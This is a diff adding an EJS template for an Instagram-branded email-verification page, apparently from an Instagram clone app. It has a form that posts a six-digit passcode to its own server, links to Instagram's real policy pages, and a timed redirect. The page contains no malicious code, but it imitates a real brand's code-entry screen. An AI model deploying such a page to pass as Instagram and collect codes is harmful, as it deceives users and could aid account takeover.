@@ -1,0 +1,26 @@
+<%- include('../partials/header.ejs') %>
+
+
+<body>
+    <div class="container">
+        <h1 class="logo">Instagram</h1>
+       
+         <p style="font-size: 15px;">
+           we send email to you and Verifay Your email with 6 digite codes
+           after one sec it will rediract to signup page
+        </p>
+        <form  id="signupForm" action="/verifayEmail" method="post">
+            <input type="text" id="email" name="passcode" placeholder="Pass code" required>
+            <p class="info-text">People who use our service may have uploaded your contact information to Instagram. <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Learn More</a></p>
+            <p class="terms">By signing up, you agree to our <a href="https://help.instagram.com/581066165581870/?locale=en_US" target="_blank">Terms</a>, <a href="https://www.facebook.com/privacy/policy" target="_blank">Privacy Policy</a> and <a href="#">Cookies Policy</a>.</p>
+            <input type="submit" id="send" class="signup-button" value="Send" style="cursor: pointer;">
+        </form>
+        <p class="get-app">Get the app.</p>
+       
+       <script>
+        setInterval(()=>{
+            window.location = "/"
+        },60000);
+       </script>
+        
+<%- include('../partials/footer.ejs') %>
